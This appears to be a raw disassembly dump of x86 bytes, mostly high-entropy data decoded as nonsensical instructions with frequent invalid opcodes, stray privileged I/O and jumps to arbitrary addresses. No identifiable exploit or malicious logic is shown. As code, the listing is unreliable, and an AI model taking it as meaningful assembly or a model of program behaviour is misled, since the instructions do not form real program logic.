  40ff74:	cdq    
  40ff75:	push   ss
  40ff76:	leave  
  40ff77:	adc    DWORD PTR [ebp+0x0],0x0
	...
  40ffbe:	add    BYTE PTR [edi-0x5c],ch
  40ffc1:	daa    
  40ffc2:	jbe    0x40ffb3
  40ffc4:	idiv   DWORD PTR [edi-0x43]
  40ffc7:	mov    ecx,0x7516f8af
  40ffcc:	and    ebp,eax
  40ffce:	jne    0x40fffb
  40ffd0:	add    eax,0x7220001
  40ffd5:	add    BYTE PTR [eax],al
  40ffd7:	add    ah,bh
  40ffd9:	dec    ecx
  40ffda:	and    bl,bl
  40ffdc:	xchg   edi,eax
  40ffdd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ffde:	jmp    0x40ff92
  40ffe0:	add    esi,DWORD PTR [ecx]
  40ffe2:	scas   eax,DWORD PTR es:[edi]
  40ffe3:	pop    esi
  40ffe4:	dec    eax
  40ffe5:	les    edx,FWORD PTR [ebp+0x3d581ba9]
  40ffeb:	fcom   st(6)
  40ffed:	out    dx,eax
  40ffee:	xchg   edx,eax
  40ffef:	xchg   ebp,eax
  40fff0:	fiadd  WORD PTR [ebx-0x3a040bd7]
  40fff6:	mov    ds:0x3c6d9d95,eax
  40fffb:	and    DWORD PTR [ecx],esi
  40fffd:	cdq    
  40fffe:	cld    
  40ffff:	mov    ch,0x62
  410001:	xor    cl,ah
  410003:	lock and eax,0x68cbef92
  410009:	push   0xfebd21c3
  41000e:	sub    al,0xaa
  410010:	hlt    
  410011:	sub    eax,0x4c8180b8
  410016:	pop    es
  410017:	ficom  DWORD PTR [ebx-0x4c]
  41001a:	jb     0x40ffcd
  41001c:	(bad)  
  41001d:	or     al,0xa5
  41001f:	push   es
  410020:	jne    0x410005
  410022:	call   0x281e:0x3b109a69
  410029:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41002a:	dec    ecx
  41002b:	pop    ebp
  41002c:	lods   al,BYTE PTR ds:[esi]
  41002d:	mov    cl,0xff
  410030:	test   BYTE PTR fs:[eax+0x3eb8395d],dl
  410037:	pusha  
  410038:	pop    esi
  410039:	inc    ebp
  41003a:	xor    bl,BYTE PTR [eax+ebp*4+0x3a]
  41003e:	jne    0x410017
  410040:	scas   al,BYTE PTR es:[edi]
  410041:	sub    al,0x1
  410043:	out    0x93,al
  410045:	nop
  410046:	in     eax,dx
  410047:	push   edi
  410048:	xchg   ebp,eax
  410049:	popf   
  41004a:	dec    edx
  41004b:	ds push ebx
  41004d:	pop    es
  41004e:	shl    BYTE PTR [ecx+0xd],cl
  410051:	fisttp WORD PTR [esi-0x9067f6b]
  410057:	xchg   BYTE PTR [ecx],cl
  410059:	gs xchg edi,eax
  41005b:	scas   eax,DWORD PTR es:[edi]
  41005c:	adc    ch,ch
  41005e:	(bad)  
  41005f:	shl    BYTE PTR [edi+eiz*1],cl
  410062:	mov    ebx,0x17f825b1
  410067:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410068:	stc    
  410069:	sub    eax,eax
  41006b:	adc    ch,bh
  41006d:	push   ecx
  41006e:	jmp    0x41004d
  410070:	push   ss
  410071:	xor    bh,BYTE PTR [ecx]
  410073:	mov    ah,0x3a
  410075:	jbe    0x4100e1
  410077:	lods   al,BYTE PTR ds:[esi]
  410078:	or     eax,0x92ace680
  41007d:	adc    al,0x5b
  41007f:	push   ecx
  410080:	push   ebx
  410081:	inc    esi
  410082:	aam    0xd7
  410084:	add    eax,DWORD PTR [eax]
  410086:	xor    edi,DWORD PTR [esi]
  410088:	mov    esi,0xdbdc295d
  41008d:	xor    al,0x61
  41008f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410090:	xchg   esp,eax
  410091:	sub    BYTE PTR [ebx-0x254dfb7d],0x39
  410098:	scas   eax,DWORD PTR es:[edi]
  410099:	ror    DWORD PTR [eax+ecx*8],0x8a
  41009d:	outs   dx,DWORD PTR ds:[esi]
  41009e:	(bad)  
  41009f:	repnz cld 
  4100a1:	mov    bl,0xb
  4100a3:	xor    eax,0x820947d7
  4100a8:	add    bh,BYTE PTR [ecx+0x33]
  4100ab:	sub    DWORD PTR [eax-0x1f],0x50
  4100af:	or     BYTE PTR [esi-0x454d4f18],ch
  4100b5:	sar    DWORD PTR [edx-0x45e809ff],cl
  4100bb:	sub    bl,dh
  4100bd:	(bad)  
  4100be:	loope  0x410111
  4100c0:	mov    ch,0xdc
  4100c2:	sbb    eax,0xfacb0b9a
  4100c7:	daa    
  4100c8:	ins    DWORD PTR es:[edi],dx
  4100c9:	xor    DWORD PTR [ecx+0x141bccd1],ebx
  4100cf:	sbb    al,0x48
  4100d1:	call   0x89a9631a
  4100d6:	xor    ecx,DWORD PTR [edi]
  4100d8:	pop    eax
  4100d9:	lahf   
  4100da:	popa   
  4100db:	mov    al,0x60
  4100dd:	loopne 0x4100c7
  4100df:	or     DWORD PTR [ebp-0x44],ebx
  4100e2:	rcr    BYTE PTR [ecx+0x71],cl
  4100e5:	pushf  
  4100e6:	push   esi
  4100e7:	lds    eax,FWORD PTR [ebp-0x29dee989]
  4100ed:	cmp    ah,bh
  4100ef:	mov    al,ds:0x9ecc1264
  4100f4:	sbb    al,0x81
  4100f6:	out    0x1b,eax
  4100f8:	(bad)  
  4100f9:	fstp   st(6)
  4100fb:	add    BYTE PTR [ebx+eax*4],bh
  4100fe:	or     BYTE PTR [edx+0x55a95a91],bh
  410104:	mov    ds:0x4d0608dd,eax
  410109:	and    ch,ch
  41010b:	aad    0x6d
  41010d:	fstp   TBYTE PTR [ecx-0x2b9f7066]
  410113:	mov    bl,0xe1
  410115:	xchg   esi,eax
  410116:	repnz sub bh,dh
  410119:	cwde   
  41011a:	(bad)  
  41011b:	shr    DWORD PTR [ebx+0x3b],1
  41011e:	add    BYTE PTR [edx-0x4b],bl
  410121:	cld    
  410122:	mov    cl,0x3
  410124:	cmp    edx,DWORD PTR [eax-0x71b4b98]
  41012a:	out    dx,al
  41012b:	adc    ebx,esp
  41012d:	fsubr  QWORD PTR [esi]
  41012f:	inc    esp
  410130:	and    edx,DWORD PTR [eax+ebx*1]
  410133:	add    dl,BYTE PTR [edi+eiz*1]
  410136:	jle    0x410130
  410138:	fmulp  st(2),st
  41013a:	mov    cl,0xb
  41013c:	fcom   st(5)
  41013e:	sub    BYTE PTR [ebx+0x2f],dl
  410141:	out    0x8b,al
  410143:	push   ebx
  410144:	aad    0xcc
  410146:	(bad)  
  410147:	frstor [ebp+0x71]
  41014a:	sbb    esp,DWORD PTR [edi]
  41014c:	pop    ebp
  41014d:	xlat   BYTE PTR ds:[ebx]
  41014e:	jne    0x4101b5
  410150:	arpl   WORD PTR [esi-0x3a],dx
  410153:	sub    ch,dh
  410155:	lock dec esp
  410157:	mul    BYTE PTR [ebp-0x67]
  41015a:	lods   al,BYTE PTR ds:[esi]
  41015b:	and    BYTE PTR [esp+edi*4],cl
  41015e:	or     al,0x5c
  410160:	sbb    DWORD PTR [ebx-0x64],edx
  410163:	and    bh,BYTE PTR [edi-0x701e396d]
  410169:	xchg   esi,eax
  41016a:	fs in  al,dx
  41016c:	retf   
  41016d:	popf   
  41016e:	daa    
  41016f:	mov    dl,0x21
  410171:	retf   0x4720
  410174:	(bad)  
  410175:	(bad)  
  410176:	and    BYTE PTR [edi-0x1573da01],dl
  41017c:	cmp    eax,0x255a161b
  410181:	(bad)  
  410182:	xchg   esp,eax
  410183:	mov    DWORD PTR [edi],esp
  410185:	mov    bh,0x72
  410187:	(bad)  
  410188:	xchg   edx,eax
  410189:	push   es
  41018a:	or     eax,0x9aafe424
  41018f:	xchg   ecx,eax
  410190:	stc    
  410191:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410192:	(bad)  
  410193:	es push cs
  410195:	movups xmm4,XMMWORD PTR ds:0xe04348d6
  41019c:	jmp    0x4101d6
  41019e:	xchg   esi,eax
  41019f:	cmp    BYTE PTR [edi-0x4d],ah
  4101a2:	xor    edi,DWORD PTR [edi]
  4101a4:	and    al,0x5b
  4101a6:	cs inc ebp
  4101a8:	int    0x26
  4101aa:	xor    eax,0x8681f84c
  4101af:	mov    al,ds:0x5b7b1e0c
  4101b4:	out    0x40,eax
  4101b6:	daa    
  4101b7:	inc    ebx
  4101b8:	ror    BYTE PTR cs:[edi+0x9],0x8f
  4101bd:	repnz inc ebp
  4101bf:	mov    cl,0xd5
  4101c1:	mov    ch,0x22
  4101c3:	sub    eax,0x699ba01e
  4101c8:	or     eax,DWORD PTR [edx+edx*8]
  4101cb:	pop    eax
  4101cc:	sbb    BYTE PTR [ebp+0xc],dh
  4101cf:	bound  esp,QWORD PTR [ebx]
  4101d1:	out    dx,eax
  4101d2:	fsubp  st(7),st
  4101d4:	and    ah,BYTE PTR [ebx-0x35]
  4101d7:	xor    DWORD PTR [esi],eax
  4101d9:	and    esp,DWORD PTR [ebp+0x7cbb99ea]
  4101df:	cmp    bl,ah
  4101e1:	add    al,0xd3
  4101e3:	adc    ah,al
  4101e5:	cmp    al,0x7
  4101e7:	bound  esp,QWORD PTR [ebp+0x12]
  4101ea:	cwde   
  4101eb:	aam    0x91
  4101ed:	arpl   WORD PTR [ecx+0x4a],ax
  4101f0:	or     bh,BYTE PTR [eax]
  4101f2:	sbb    al,BYTE PTR [edx+0x60ad448f]
  4101f8:	(bad)  
  4101f9:	sub    al,0x33
  4101fb:	xor    BYTE PTR [eax-0x4378654d],al
  410201:	mov    ds:0x41a55fdc,eax
  410206:	mov    BYTE PTR cs:[ecx-0x49],dh
  41020a:	lods   al,BYTE PTR ds:[esi]
  41020b:	mov    ebx,0x67ba3a2b
  410210:	test   al,0x78
  410212:	lock addr16 dec eax
  410215:	gs push ebx
  410217:	sub    al,0x10
  410219:	rcl    BYTE PTR [edx+0x579c4d82],0xea
  410220:	dec    ecx
  410221:	pop    ecx
  410222:	mov    edi,DWORD PTR [ebx]
  410224:	and    ebx,DWORD PTR [edi-0x3b]
  410227:	mov    cl,0x7c
  410229:	aas    
  41022a:	fisubr WORD PTR [edi-0x1bdb2b5a]
  410230:	in     eax,0x21
  410232:	jae    0x410289
  410234:	les    esp,FWORD PTR [eax+eiz*2]
  410237:	push   eax
  410238:	or     DWORD PTR [edx+0x64029959],edx
  41023e:	cmp    DWORD PTR [ebp+0x21],eax
  410241:	pop    es
  410242:	fisttp DWORD PTR [esi+0x1c5380f4]
  410248:	pop    es
  410249:	(bad)  [edi+0x4a]
  41024c:	fldcw  WORD PTR [ecx+0x3d805c0]
  410252:	dec    ebp
  410253:	cs jbe 0x41020a
  410256:	test   BYTE PTR [edi],dh
  410258:	sub    al,0x32
  41025a:	adc    DWORD PTR [edx-0xff3aa37],esi
  410260:	cs ss retf 
  410263:	dec    esp
  410264:	call   0xcf4708a4
  410269:	mov    ebp,0x2f654d24
  41026e:	loop   0x4102df
  410270:	sub    bh,BYTE PTR [ecx]
  410272:	inc    eax
  410273:	sahf   
  410274:	push   es
  410275:	or     dl,dl
  410277:	pop    ecx
  410278:	ret    
  410279:	xor    eax,0xf747503a
  41027e:	fisubr DWORD PTR [edx-0x7c]
  410281:	lahf   
  410282:	mov    ah,0x1c
  410284:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410285:	mov    DWORD PTR [eax],0xa7eb0fa
  41028b:	addr16 aam 0x6a
  41028e:	aam    0xda
  410290:	mov    bh,0x78
  410292:	add    DWORD PTR [ebp-0x3eee3c8e],edx
  410298:	push   esp
  410299:	rcl    esp,cl
  41029b:	inc    edi
  41029c:	xor    esp,ebx
  41029e:	popf   
  41029f:	sub    eax,0xc89c8d65
  4102a4:	sar    DWORD PTR [ecx+eax*4],cl
  4102a7:	(bad)  
  4102a8:	mov    gs,WORD PTR [esi+0x55]
  4102ab:	mov    ecx,0x9dc8a6ba
  4102b0:	push   es
  4102b1:	(bad)  
  4102b2:	lahf   
  4102b3:	mov    esp,0x79e34625
  4102b8:	sbb    eax,0xc4c7df77
  4102bd:	pop    esi
  4102be:	mov    ebx,0x17acbbfc
  4102c3:	ss sti 
  4102c5:	call   0xcfb547d2
  4102ca:	jecxz  0x410276
  4102cc:	mov    al,ds:0x5c706248
  4102d1:	repz add eax,0x5ac4b1ad
  4102d7:	xchg   DWORD PTR [edx],esi
  4102d9:	mov    edx,0x49297a6
  4102de:	in     eax,dx
  4102df:	addr16 in al,0xa1
  4102e2:	mov    dh,0xe
  4102e4:	jnp    0x410271
  4102e6:	es ret 
  4102e8:	mov    DWORD PTR [esp+edi*2+0x1e],esi
  4102ec:	push   ebp
  4102ed:	add    ebp,DWORD PTR [ebx]
  4102ef:	cmc    
  4102f0:	sbb    DWORD PTR [esi],edi
  4102f2:	xor    dl,dl
  4102f4:	lds    edi,FWORD PTR [edx]
  4102f6:	push   cs
  4102f7:	vmovaps ymm5,YMMWORD PTR [ebx]
  4102fb:	push   ss
  4102fc:	dec    esp
  4102fd:	xor    esi,DWORD PTR [ebx]
  4102ff:	fdivp  st(7),st
  410301:	push   ebx
  410302:	adc    al,0x5e
  410304:	pusha  
  410305:	mov    esi,0x1c05c320
  41030a:	or     al,BYTE PTR [ecx+0x24]
  41030d:	ret    0xc3a9
  410310:	int    0x7b
  410312:	dec    esi
  410313:	inc    ebx
  410314:	les    eax,FWORD PTR [ebp+edi*1+0x79]
  410318:	cmp    eax,0x844f463d
  41031d:	mov    ds:0xde729431,eax
  410322:	cmp    ch,ch
  410324:	cmp    ch,BYTE PTR ds:0x681c2c07
  41032b:	out    0x31,eax
  41032d:	int    0x94
  41032f:	pusha  
  410330:	jmp    0x650c:0xfd3195fb
  410337:	dec    esi
  410338:	mov    ch,0xf
  41033a:	shr    BYTE PTR [eax-0x362a9b75],0xdc
  410341:	mov    ebx,0x34c16780
  410346:	(bad)  
  410347:	loop   0x4102ee
  410349:	sbb    DWORD PTR [edx+0x629a16fa],esp
  41034f:	mov    esp,0xf77f8634
  410354:	mov    dh,0xbc
  410356:	stos   BYTE PTR es:[edi],al
  410357:	cmc    
  410358:	push   edx
  410359:	mov    edx,0x7d5071f9
  41035e:	(bad)  
  41035f:	aad    0xe7
  410361:	pop    esi
  410362:	sbb    al,0xbd
  410364:	cmp    edx,DWORD PTR [ecx]
  410366:	(bad)  
  410367:	shl    BYTE PTR [edx+0x7f0748c6],1
  41036d:	add    eax,0x730ca024
  410372:	push   es
  410373:	mov    ecx,0x6047b0dd
  410378:	push   0x35ff7411
  41037d:	les    ecx,FWORD PTR [ecx]
  41037f:	dec    ecx
  410380:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410381:	add    eax,DWORD PTR [ebx-0x4ccc415a]
  410387:	cli    
  410388:	xchg   esp,eax
  410389:	and    BYTE PTR [ebx-0x7a],ah
  41038c:	jno    0x4103b3
  41038e:	pop    ecx
  41038f:	add    ebp,DWORD PTR [edx+0x48]
  410392:	mov    gs,WORD PTR [ebp+0x1]
  410395:	jle    0x410341
  410397:	daa    
  410398:	xor    BYTE PTR [ebp-0x30e5162],dl
  41039e:	xchg   esp,eax
  41039f:	ret    0x5225
  4103a2:	das    
  4103a3:	xlat   BYTE PTR ds:[ebx]
  4103a4:	test   al,0xd4
  4103a6:	adc    DWORD PTR [esi+eax*8],edx
  4103a9:	mov    dh,0x2e
  4103ab:	inc    ecx
  4103ac:	mov    cl,0xf6
  4103ae:	les    edi,FWORD PTR [esi+ebx*1-0x3bf071ff]
  4103b5:	push   ss
  4103b6:	sub    BYTE PTR cs:[edx],cl
  4103b9:	inc    edi
  4103ba:	daa    
  4103bb:	ror    BYTE PTR [edi],cl
  4103bd:	enter  0xaedb,0x33
  4103c1:	pop    ebx
  4103c2:	out    dx,al
  4103c3:	cmp    BYTE PTR [ebp+0x47],cl
  4103c6:	repz gs dec edi
  4103c9:	and    al,0x44
  4103cb:	sbb    eax,esi
  4103cd:	and    DWORD PTR ds:0x67932311,eax
  4103d3:	bound  edi,QWORD PTR [eax]
  4103d5:	ss mov al,0x94
  4103d8:	jne    0x41039a
  4103da:	adc    eax,0xf55751cd
  4103df:	sbb    al,0x6a
  4103e1:	aam    0x67
  4103e3:	mov    dh,0xed
  4103e5:	push   esp
  4103e6:	sbb    al,0xc
  4103e8:	adc    al,0x58
  4103ea:	ror    DWORD PTR [ecx+0x5c],cl
  4103ed:	adc    DWORD PTR [ebp+0x40f95bc7],edx
  4103f3:	fisub  WORD PTR [eax-0x7d7b5fe9]
  4103f9:	add    eax,0x8faab907
  4103fe:	sbb    BYTE PTR [eax],dl
  410400:	div    DWORD PTR [edx-0x70436def]
  410406:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410407:	fstp   DWORD PTR [eax+0x6dccb2c4]
  41040d:	(bad)  
  41040e:	icebp  
  41040f:	push   eax
  410410:	mov    cs,WORD PTR [ebx-0x65]
  410413:	rcr    BYTE PTR [esi-0x12],1
  410416:	push   0xffffff92
  410418:	cmp    ebx,edi
  41041a:	scas   ax,WORD PTR es:[edi]
  41041c:	and    edx,DWORD PTR [edi+0x2]
  41041f:	outs   dx,DWORD PTR ds:[esi]
  410420:	dec    edx
  410421:	jmp    0x1fca:0xcc3b0907
  410428:	xchg   BYTE PTR [eax-0x1f795ba5],cl
  41042e:	(bad)  
  41042f:	jl     0x410402
  410431:	jns    0x4103f8
  410433:	jg     0x4103d1
  410435:	adc    ebp,DWORD PTR [eax-0x449894cc]
  41043b:	scas   eax,DWORD PTR es:[edi]
  41043c:	jle    0x4103c2
  41043e:	bound  ebp,QWORD PTR [ebx]
  410440:	cdq    
  410441:	lds    eax,FWORD PTR [edi+0x335009a4]
  410447:	js     0x410448
  410449:	dec    edx
  41044a:	jle    0x410459
  41044c:	lods   eax,DWORD PTR ds:[esi]
  41044d:	mov    ch,0xa4
  41044f:	cmpps  xmm6,xmm5,0xf3
  410453:	into   
  410454:	call   0xf666b519
  410459:	xlat   BYTE PTR ds:[ebx]
  41045a:	mov    WORD PTR [ebx+0x322c83bb],?
  410460:	mov    esp,0x6af0a440
  410465:	fadd   QWORD PTR [edi]
  410467:	jecxz  0x410431
  410469:	pushf  
  41046a:	stc    
  41046b:	cmp    ecx,DWORD PTR [ebx+0x63]
  41046e:	rol    BYTE PTR [esp+ebp*4-0x3a],cl
  410472:	pop    ecx
  410473:	push   esi
  410474:	push   ss
  410475:	dec    ebx
  410476:	rcr    DWORD PTR [edi-0x335a28f3],cl
  41047c:	inc    ecx
  41047d:	or     ch,ah
  41047f:	mov    ds:0xc76b9b50,al
  410484:	retf   0xfec9
  410487:	adc    eax,0x77ab5193
  41048c:	cvttps2pi mm5,QWORD PTR [ebp+0xe55f6d5]
  410493:	in     al,0x93
  410495:	xchg   edi,eax
  410496:	adc    eax,DWORD PTR [ebp+ebp*1+0x3]
  41049a:	xchg   esp,eax
  41049b:	(bad)  
  41049c:	add    cl,0x66
  41049f:	rol    eax,1
  4104a1:	sbb    al,0x1b
  4104a3:	stos   BYTE PTR es:[edi],al
  4104a4:	in     eax,dx
  4104a5:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  4104a7:	mov    WORD PTR [edi-0x17f98e7b],gs
  4104ad:	stos   DWORD PTR es:[edi],eax
  4104ae:	inc    esp
  4104af:	xchg   ebx,eax
  4104b0:	inc    edi
  4104b1:	faddp  st(3),st
  4104b3:	or     BYTE PTR ds:0xb830c7f8,cl
  4104b9:	jbe    0x410538
  4104bb:	push   edi
  4104bc:	mov    BYTE PTR ds:0x2afd73f9,ch
  4104c2:	ficom  DWORD PTR [edx]
  4104c4:	out    dx,eax
  4104c5:	imul   esp,DWORD PTR [edi-0x44b874b],0x2b3bb9a0
  4104cf:	mov    ecx,0xe5f78ab1
  4104d4:	ins    DWORD PTR es:[edi],dx
  4104d5:	add    eax,0xd12305db
  4104da:	push   esp
  4104db:	imul   eax,DWORD PTR [edi+0x47b3f654],0x30aee0b5
  4104e5:	or     dh,BYTE PTR [edx+0x7fb70ba0]
  4104eb:	mov    bl,0x12
  4104ed:	pop    ecx
  4104ee:	fisubr WORD PTR [ecx+0x243c40cc]
  4104f4:	enter  0x3bd1,0xb2
  4104f8:	(bad)  
  4104f9:	pop    ds
  4104fa:	fxam   
  4104fc:	scas   eax,DWORD PTR es:[edi]
  4104fd:	mov    al,0xb
  4104ff:	inc    eax
  410500:	dec    edi
  410501:	mov    ecx,0x8a859be6
  410506:	int3   
  410507:	addr16 pusha 
  410509:	lods   eax,DWORD PTR ds:[esi]
  41050a:	stos   BYTE PTR es:[edi],al
  41050b:	add    ecx,DWORD PTR [edx-0x12]
  41050e:	and    dh,BYTE PTR [edi+0x5]
  410511:	scas   eax,DWORD PTR es:[edi]
  410512:	mov    al,0xa0
  410514:	sbb    eax,0x751eeef8
  410519:	xchg   ebx,eax
  41051a:	std    
  41051b:	in     eax,0xfe
  41051d:	dec    edi
  41051e:	mov    esi,0x5ab3401e
  410523:	cmc    
  410524:	bound  edi,QWORD PTR [ecx]
  410526:	sub    esp,DWORD PTR [edi-0x6ba1776a]
  41052c:	sbb    ebx,esi
  41052e:	sbb    al,0x8a
  410530:	sbb    DWORD PTR [ecx],edx
  410532:	js     0x4104cc
  410534:	mov    al,ds:0xc79574ae
  410539:	dec    esi
  41053a:	jle    0x41054e
  41053c:	xchg   edx,eax
  41053d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41053e:	cli    
  41053f:	loopne 0x41057d
  410541:	sbb    eax,0x6fef0048
  410546:	dec    BYTE PTR ds:0xb0d1790f
  41054c:	pop    es
  41054d:	lods   al,BYTE PTR ds:[esi]
  41054e:	and    DWORD PTR ds:0x54475353,ecx
  410554:	or     ebp,DWORD PTR [edi-0x79]
  410557:	fdivr  QWORD PTR [ebx+edx*2+0xa]
  41055b:	xchg   esp,eax
  41055c:	call   DWORD PTR [ebx+0x5d]
  41055f:	mov    dh,0xf8
  410561:	in     eax,dx
  410562:	sbb    DWORD PTR [edx+0x7d],eax
  410565:	adc    dl,BYTE PTR [ebp+0xa02a4e0]
  41056b:	xor    al,0x5c
  41056d:	pop    ebx
  41056e:	shl    DWORD PTR [esi+ebx*1-0x26],0xfc
  410573:	fs mov cl,0x51
  410576:	mov    al,0xc1
  410578:	adc    BYTE PTR [esi+edx*2+0x78],dl
  41057c:	and    esp,edx
  41057e:	ins    DWORD PTR es:[edi],dx
  41057f:	out    dx,eax
  410580:	jle    0x410507
  410582:	iret   
  410583:	pop    ecx
  410584:	sti    
  410585:	mov    edi,0x336b03e1
  41058a:	sahf   
  41058b:	jecxz  0x410563
  41058d:	mov    eax,ds:0xfc84d5b6
  410592:	dec    ebx
  410593:	xchg   edx,eax
  410594:	sbb    DWORD PTR [eax],ebx
  410596:	and    DWORD PTR [esp+eiz*8-0x2d],eax
  41059a:	jne    0x410599
  41059c:	aam    0x6
  41059e:	mov    eax,0xa734f321
  4105a3:	leave  
  4105a4:	test   cl,0xa2
  4105a7:	icebp  
  4105a8:	dec    ecx
  4105a9:	ret    
  4105aa:	sahf   
  4105ab:	adc    DWORD PTR [edi*8+0x7f137de0],ebx
  4105b2:	fild   DWORD PTR [edx+ebp*2+0x447532b]
  4105b9:	jle    0x4105ad
  4105bb:	jae    0x410591
  4105bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4105be:	repnz call 0x663c:0xd521c9b6
  4105c6:	sub    DWORD PTR [ebp-0x49],ebp
  4105c9:	jmp    0xbbb9:0xb95493f7
  4105d0:	mov    dh,0x30
  4105d2:	pop    eax
  4105d3:	dec    ecx
  4105d4:	test   al,0xe0
  4105d6:	push   ebx
  4105d7:	not    BYTE PTR [ebp+0x4ba96e8b]
  4105dd:	dec    edx
  4105de:	dec    ebp
  4105df:	cwde   
  4105e0:	dec    eax
  4105e1:	push   cs
  4105e2:	mov    edi,0x704aa756
  4105e7:	and    edx,eax
  4105e9:	test   BYTE PTR [ecx+0x4b40c6f6],al
  4105ef:	push   edx
  4105f0:	pop    es
  4105f1:	cmp    al,0x9d
  4105f3:	je     0x4105bb
  4105f5:	arpl   WORD PTR [ebx+0x6876c900],di
  4105fb:	test   eax,0x761b1a4
  410600:	std    
  410601:	cld    
  410602:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410603:	popa   
  410604:	lahf   
  410605:	sbb    eax,0x73c75a32
  41060a:	or     bl,BYTE PTR [esp+esi*4]
  41060d:	icebp  
  41060e:	(bad)  
  41060f:	fwait
  410610:	dec    esi
  410611:	mov    ecx,0x1db2a010
  410616:	rcl    BYTE PTR [ebp-0x44],0x9
  41061a:	js     0x41063f
  41061c:	add    bh,ch
  41061e:	data16 xor al,0xbc
  410621:	dec    eax
  410622:	je     0x41069e
  410624:	aaa    
  410625:	stos   BYTE PTR es:[edi],al
  410626:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410627:	push   ecx
  410628:	inc    ecx
  410629:	mov    ds:0x2b4f4d92,al
  41062e:	xchg   BYTE PTR ds:0xf2581ebf,dl
  410634:	cmp    DWORD PTR [ebp+0x14fb17e3],edi
  41063a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41063b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41063c:	cld    
  41063d:	xchg   ebx,eax
  41063e:	dec    edi
  41063f:	rcr    DWORD PTR [edx+0x282e3a20],cl
  410645:	mov    ebx,0x9823521a
  41064a:	popa   
  41064b:	inc    esp
  41064c:	pop    ds
  41064d:	xchg   esp,eax
  41064e:	jge    0x410648
  410650:	pop    edx
  410651:	and    bl,ch
  410653:	add    eax,0xcd2d4012
  410658:	daa    
  410659:	fcmove st,st(1)
  41065b:	jmp    0x4106a0
  41065d:	and    ebx,DWORD PTR [ebx-0x5ff167a8]
  410663:	in     al,0x82
  410665:	jge    0x41063a
  410667:	add    esi,ebp
  410669:	into   
  41066a:	fst    QWORD PTR [eax-0x571a2797]
  410670:	mov    edi,0x46597346
  410675:	les    edi,FWORD PTR [ecx]
  410677:	inc    esi
  410679:	popf   
  41067a:	inc    ecx
  41067b:	add    ebp,eax
  41067d:	pop    ebp
  41067e:	jmp    0x80b3f936
  410683:	push   esi
  410684:	js     0x4106af
  410686:	jl     0x410675
  410688:	(bad)  
  410689:	pop    esp
  41068a:	inc    edx
  41068b:	adc    eax,0x45145a7c
  410690:	inc    ecx
  410691:	add    eax,0xf7a4139d
  410696:	sbb    eax,0xfc2f6c17
  41069b:	jo     0x410653
  41069d:	push   es
  41069e:	out    dx,al
  41069f:	shr    DWORD PTR [edx+edx*1],1
  4106a2:	bound  esp,QWORD PTR [ebx+eiz*8]
  4106a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4106a6:	cmp    al,0xa2
  4106a8:	shr    DWORD PTR [edi+0x2e],cl
  4106ab:	sar    BYTE PTR [edi+0x31905064],cl
  4106b1:	lock dec esi
  4106b3:	bnd jb 0x41072f
  4106b6:	pop    es
  4106b7:	pop    esi
  4106b8:	push   ecx
  4106b9:	loope  0x41065f
  4106bb:	enter  0x4d63,0xf6
  4106bf:	adc    BYTE PTR [ebx+ebp*8-0x6f],dh
  4106c3:	xchg   ebp,eax
  4106c4:	sahf   
  4106c5:	ins    BYTE PTR es:[edi],dx
  4106c6:	mov    DWORD PTR [ecx+0x6],esi
  4106c9:	push   edx
  4106ca:	inc    esi
  4106cb:	add    al,0xa7
  4106cd:	mov    ebp,0x404a6f84
  4106d2:	xchg   ebp,eax
  4106d3:	adc    al,ch
  4106d5:	gs mov cl,0x6c
  4106d8:	add    eax,0x34ccc75e
  4106dd:	inc    esp
  4106de:	dec    ecx
  4106df:	jne    0x4106da
  4106e1:	mov    ebx,0x4a29c3fd
  4106e6:	(bad)  
  4106e7:	cmp    edx,DWORD PTR [ebp+0x19]
  4106ea:	(bad)  
  4106eb:	rcl    bh,0x81
  4106ee:	jl     0x4106ff
  4106f0:	pop    edi
  4106f1:	add    eax,0xd60ca688
  4106f6:	lahf   
  4106f7:	mov    al,ds:0x8e
	...
  41073c:	add    BYTE PTR [eax],al
  41073e:	add    BYTE PTR [ebx+0x1b],bh
  410741:	adc    BYTE PTR [eax],al
  410743:	lods   al,BYTE PTR ds:[esi]
  410744:	push   ebp
  410745:	adc    BYTE PTR [eax],al
  410747:	punpcklwd mm2,DWORD PTR [eax]
  41074a:	add    BYTE PTR [edi+0x6300100d],ch
  410750:	adc    BYTE PTR gs:[eax],al
  410753:	shl    BYTE PTR [edi],0x10
  410756:	add    BYTE PTR [ecx+0x7300101d],dh
  41075c:	js     0x41076e
  41075e:	add    BYTE PTR [ebp+0x38],al
  410761:	xor    eax,0x565f3235
  410766:	aaa    
  410767:	add    BYTE PTR [eax+0x30],dl
  41076a:	push   esp
  41076b:	pop    edi
  41076c:	inc    edi
  41076d:	dec    ebp
  41076e:	xor    bl,BYTE PTR [edx+0x5f]
  410771:	inc    esp
  410772:	ss xor BYTE PTR ss:0x4f494c00,dh
  41077a:	xor    BYTE PTR [edi],dh
  41077c:	pop    edi
  41077d:	dec    edx
  41077e:	inc    ecx
  41077f:	add    BYTE PTR [ecx+0x47],bl
  410782:	pop    edx
  410783:	xor    eax,0x4442595f
  410788:	dec    esi
  410789:	inc    ebx
  41078a:	pop    edi
  41078b:	xor    eax,0x334a0048
  410790:	push   ecx
  410791:	pop    edi
  410792:	xor    al,BYTE PTR [esi+0x35]
  410795:	push   eax
  410796:	cmp    DWORD PTR [eax],edi
  410798:	add    BYTE PTR [ebp+0x32],dl
  41079b:	push   edi
  41079c:	xor    BYTE PTR [edi+0x42],bl
  41079f:	dec    eax
  4107a0:	inc    ebp
  4107a1:	pop    edi
  4107a2:	xor    ebx,DWORD PTR [eax+0x46]
  4107a5:	dec    ebx
  4107a6:	inc    esp
  4107a7:	aaa    
